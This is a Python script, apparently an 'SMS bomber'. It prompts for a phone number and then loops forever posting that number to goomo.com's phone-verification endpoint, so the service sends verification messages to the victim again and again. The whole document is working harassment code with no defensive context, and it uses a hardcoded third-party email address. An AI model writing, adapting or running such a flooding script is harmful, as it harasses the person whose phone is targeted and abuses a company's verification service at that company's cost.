#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def goomo(phone): #phone = 0943687522
	link = "https://auth.goomo.com/v2/phone_confirmation/verify_user"
	json = {"email":"baonhi@gmail.com","phone_number":"","country_code":"+84"}
	json["phone_number"] = phone
	res = requests.post(link,json=json)
	return(res,res.text)

phone = input(">_ Phone : ")
count = 0
while True:
	count = count + 1
	print(count,goomo(phone))
